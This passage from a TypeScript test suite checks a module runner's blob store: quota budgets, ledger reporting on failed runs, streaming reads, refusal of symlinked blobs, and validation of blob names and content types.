      const { blobs, env } = await withBlobs(budget(1.5 * MIB));
      const run = await runRunner({ module: fixture("writesConcurrentBlobs.mjs"), env });

      expect(run.code).toBe(0);
      const envelope = envelopeOf(run);
      const outcomes = envelope.result as Outcome[];
      const committed = outcomes.filter((o) => o.ref !== undefined);
      const refused = outcomes.filter((o) => o.code !== undefined);
      expect(committed).toHaveLength(1);
      expect(refused).toEqual([
        { code: "blob_quota", message: expect.stringContaining("left of its budget") },
      ]);
      expect((envelope.blobs as Ledger).map((line) => line.ref)).toEqual([committed[0]?.ref]);
      expect(await readdir(blobs)).toEqual([idOf(committed[0]?.ref ?? "")]);
    });

    it("without the variable, a server older than it, the per-blob cap alone bounds a write", async () => {
      // `withBlobs` sets no budget: two writes go, as they did before the variable existed.
      const { blobs, env } = await withBlobs();
      const run = await runRunner({
        module: fixture("writesSizedBlobs.mjs"),
        stdin: JSON.stringify({ sizes: [1, 1] }),
        env,
      });
      expect(run.code).toBe(0);
      const outcomes = envelopeOf(run).result as Outcome[];
      expect(outcomes.map((o) => o.ref)).toEqual([
        expect.stringMatching(REF),
        expect.stringMatching(REF),
      ]);
      expect(envelopeOf(run).blobs).toHaveLength(2);
      expect(await readdir(blobs)).toHaveLength(2);
    });
  });

  /**
   * A failed run's blobs (GRA-187, after Greptile on #148): the blob is committed before the module's
   * outcome is known, so the failure carries the ledger out ahead of it, behind the sentinel on
   * stdout, or in the result file on the detached path.
   */
  describe("a module that writes and then fails", () => {
    it("exits 1 with the error on stderr and the ledger behind the sentinel on stdout, the blob committed", async () => {
      const { blobs, env } = await withBlobs();
      const run = await runRunner({ module: fixture("writesThenThrows.mjs"), env });

      expect(run.code).toBe(1);
      expect(run.stderr).toContain("fell over after writing blob://");
      const [sentinel, json, ...rest] = run.stdout.split("\n");
      expect(sentinel).toBe(ENVELOPE_MARKER);
      expect(rest).toEqual([""]);
      const envelope = JSON.parse(json ?? "") as { result: unknown; blobs: Ledger };
      expect(envelope.result).toBeNull();
      expect(envelope.blobs).toEqual([
        {
          ref: expect.stringMatching(REF),
          bytes: 20,
          contentType: "text/plain",
          name: "kept.txt",
          expiresAt: expect.any(String),
        },
      ]);
      expect(await readdir(blobs)).toEqual([idOf(envelope.blobs[0]?.ref ?? "")]);
    });

    it("does the same for a result JSON cannot carry, and on the detached path writes the envelope to the result file", async () => {
      const sync = await withBlobs();
      const unserialisable = await runRunner({
        module: fixture("writesThenThrows.mjs"),
        stdin: JSON.stringify({ unserialisable: true }),
        env: sync.env,
      });
      expect(unserialisable.code).toBe(1);
      expect(unserialisable.stderr).toContain("not serialisable as JSON");
      expect(unserialisable.stdout.startsWith(`${ENVELOPE_MARKER}\n`)).toBe(true);
      expect(JSON.parse(unserialisable.stdout.slice(ENVELOPE_MARKER.length)).blobs).toHaveLength(1);

      const resultPath = join(fixtures, "results", "failed.result.json");
      const detached = await withBlobs({ GRAFT_RESULT_PATH: resultPath });
      const run = await runRunner({ module: fixture("writesThenThrows.mjs"), env: detached.env });
      expect(run.code).toBe(1);
      expect(run.stdout).toBe(`${RESULT_MARKER}${resultPath}\n`);
      const written = await writtenEnvelope(resultPath);
      expect(written.result).toBeNull();
      expect(written.blobs).toHaveLength(1);
      expect(await readdir(detached.blobs)).toHaveLength(1);
    });

    it("a module that wrote nothing fails with nothing on stdout, as before", async () => {
      const { env } = await withBlobs();
      const run = await runRunner({ module: fixture("throws.mjs"), env });
      expect(run.code).toBe(1);
      expect(run.stdout).toBe("");
    });
  });

  it("read answers the bytes and the media type the write was given", async () => {
    const { env } = await withBlobs();
    const bytes = Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2d, 0x00, 0xff, 0x0a]);
    const run = await runRunner({
      module: fixture("readsBlob.mjs"),
      stdin: JSON.stringify({
        base64: bytes.toString("base64"),
        contentType: "application/pdf",
        name: "invoice.pdf",
      }),
      env,
    });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    const result = resultOf(run) as { file: string; size: number; type: string; base64: string };
    expect(result.file).toMatch(REF);
    expect(result.size).toBe(bytes.length);
    expect(result.type).toBe("application/pdf");
    expect(Buffer.from(result.base64, "base64").equals(bytes)).toBe(true);
  });

  it("read's Blob streams a 20 MiB blob in chunks without holding it whole", async () => {
    const { env } = await withBlobs({ NODE_OPTIONS: "--expose-gc" });
    const run = await runRunner({ module: fixture("streamsLargeBlob.mjs"), env });

    expect(run.code).toBe(0);
    expect(run.stderr).toBe("");
    const result = resultOf(run) as {
      size: number;
      type: string;
      chunks: number;
      total: number;
      maxChunk: number;
      baseline: number;
      peak: number;
      gc: string;
    };
    const size = 20 * 1024 * 1024;
    expect(result.gc).toBe("function");
    expect(result.size).toBe(size);
    expect(result.type).toBe("application/octet-stream");
    expect(result.total).toBe(size);
    // Many chunks, none of them the file: the stream is the file read a piece at a time.
    expect(result.chunks).toBeGreaterThan(16);
    expect(result.maxChunk).toBeLessThan(size / 8);
    // And the process never held the blob's bytes: the high-water mark of ArrayBuffer memory over
    // the read, collected every sixteen chunks, stays well under the blob's size.
    expect(result.peak - result.baseline).toBeLessThan(size / 4);
  }, 60_000);

  it("read refuses a symlink at the blob's directory or at its data as blob_not_found, and every dead ref stat refuses", async () => {
    const { blobs, env } = await withBlobs();
    const written = await runRunner({
      module: fixture("writesBlob.mjs"),
      stdin: JSON.stringify({ text: "real bytes" }),
      env,
    });
    const real = (resultOf(written) as { file: string }).file;
    const realId = idOf(real);
    // A directory that is a link to the real blob, and a blob whose `data` is a link to the real data.
    const linkedDir = "1e1e1e1e-0000-4000-8000-000000000001";
    const linkedData = "1e1e1e1e-0000-4000-8000-000000000002";
    await symlink(join(blobs, realId), join(blobs, linkedDir), "dir");
    await mkdir(join(blobs, linkedData));
    await copyFile(join(blobs, realId, "meta.json"), join(blobs, linkedData, "meta.json"));
    await symlink(join(blobs, realId, "data"), join(blobs, linkedData, "data"), "file");

    const run = await runRunner({
      module: fixture("readRefs.mjs"),
      stdin: JSON.stringify({
        ...DEAD_REFS,
        real,
        linkedDir: `blob://${linkedDir}`,
        linkedData: `blob://${linkedData}`,
      }),
      env,
    });

    expect(run.code).toBe(0);
    const result = resultOf(run) as Record<
      string,
      { code?: string | null; message?: string; size?: number; type?: string }
    >;
    expect(result.real).toEqual({ size: 10, type: "text/plain" });
    for (const key of [...Object.keys(DEAD_REFS), "linkedDir", "linkedData"]) {
      expect(result[key]?.code, key).toBe("blob_not_found");
    }
    expect(result.linkedDir?.message).toContain(`blob://${linkedDir}`);
    expect(result.linkedData?.message).toContain(`blob://${linkedData}`);
    // The links and their target are left as they were: refused, not followed and not removed.
    expect(await readFile(join(blobs, realId, "data"), "utf8")).toBe("real bytes");
    expect((await lstat(join(blobs, linkedDir))).isSymbolicLink()).toBe(true);
    expect((await lstat(join(blobs, linkedData, "data"))).isSymbolicLink()).toBe(true);
  });

  it("refuses a write of something that is not bytes, or with no content type, before touching the disk", async () => {
    const { blobs, env } = await withBlobs();
    const asString = await runRunner({
      module: fixture("blobBadWrite.mjs"),
      stdin: JSON.stringify({ text: "plain text", contentType: "text/plain" }),
      env,
    });
    expect(resultOf(asString)).toEqual({
      refused: expect.stringMatching(
        /a Uint8Array, a Blob or a ReadableStream<Uint8Array>, not string/,
      ),
    });
    const noType = await runRunner({
      module: fixture("blobBadWrite.mjs"),
      stdin: JSON.stringify({ text: "plain text", contentType: "" }),
      env,
    });
    expect(resultOf(noType)).toEqual({
      refused: expect.stringMatching(/takes \{ contentType \}/),
    });
    expect(await readdir(blobs)).toEqual([]);
  });

  /** The ledger the result carries is bounded by construction: a name is a file name, a content type a media type. */
  it("refuses blob_invalid_name and blob_invalid_content_type before touching the disk, and admits a media type with parameters", async () => {
    const { blobs, env } = await withBlobs();
    const attempt = async (contentType: string, name?: string) =>
      resultOf(
        await runRunner({
          module: fixture("blobBadMeta.mjs"),
          stdin: JSON.stringify({ contentType, ...(name !== undefined ? { name } : {}) }),
          env,
        }),
      ) as { refused?: string; code?: string | null } | string;

    expect(await attempt("text/plain", "n".repeat(MAX_BLOB_NAME_CHARS + 1))).toMatchObject({
      code: "blob_invalid_name",
      refused: expect.stringMatching(/^blob_invalid_name: .*at most 255 characters, no slash/),
    });
    expect(await attempt("text/plain", "dir/file.txt")).toMatchObject({
      code: "blob_invalid_name",
    });
    expect(await attempt("text/plain", "ab")).toMatchObject({ code: "blob_invalid_name" });
    expect(await attempt(`text/${"x".repeat(MAX_BLOB_CONTENT_TYPE_CHARS)}`)).toMatchObject({
      code: "blob_invalid_content_type",
      refused: expect.stringMatching(/^blob_invalid_content_type: .*at most 128 characters/),
    });
    expect(await attempt("not a media type")).toMatchObject({ code: "blob_invalid_content_type" });
    expect(await attempt("text\n/plain")).toMatchObject({ code: "blob_invalid_content_type" });
    expect(await readdir(blobs)).toEqual([]);

    expect(await attempt("text/csv; charset=utf-8", "report.csv")).toBe("written");
    expect(await attempt("application/vnd.ms-excel")).toBe("written");
    expect(await readdir(blobs)).toHaveLength(2);
  }, 30_000);

  it("refuses blob_store_unavailable rather than making a blobs directory of its own when the mount is not there", async () => {
    const run = await runRunner({
      module: fixture("writesBlob.mjs"),
      stdin: JSON.stringify({ text: "x" }),
      env: { GRAFT_BLOBS_DIR: join(fixtures, "no-such-mount") },
    });

    expect(run.code).toBe(1);
    expect(run.stdout).toBe("");
    expect(run.stderr).toMatch(/blob_store_unavailable: .*no-such-mount is not mounted/);
    await expect(stat(join(fixtures, "no-such-mount"))).rejects.toThrow();
  });

  it("carries the ledger in the envelope on the detached path and in a dry run alike", async () => {
    const resultPath = join(fixtures, "results", "blob.result.json");
    const detached = await withBlobs({ GRAFT_RESULT_PATH: resultPath });
    const run = await runRunner({
      module: fixture("writesBlob.mjs"),
      stdin: JSON.stringify({ text: "detached" }),
      env: detached.env,
    });
    expect(run.code).toBe(0);
    expect(run.stdout).toBe(`${RESULT_MARKER}${resultPath}\n`);
    const written = await writtenEnvelope(resultPath);
    expect((written.result as { file: string }).file).toMatch(REF);
    expect(written.blobs).toEqual([
      {
        ref: expect.stringMatching(REF),
        bytes: 8,
        contentType: "text/plain",
        expiresAt: expect.any(String),
      },
    ]);

    const dryRun = await withBlobs(dry());
    const dried = await runRunner({
      module: fixture("writesBlob.mjs"),
      stdin: JSON.stringify({ text: "dry" }),
      env: dryRun.env,
    });
    expect(dried.code).toBe(0);
    const envelope = envelopeOf(dried);
    const report = envelope.result as DryRunReport;
    expect(report.dryRun).toBe(true);
    expect(report.passed).toBe(true);
    expect((report.moduleResult as { file: string }).file).toMatch(REF);
    expect(envelope.blobs).toHaveLength(1);
    expect(await readdir(dryRun.blobs)).toHaveLength(1);
  });
});
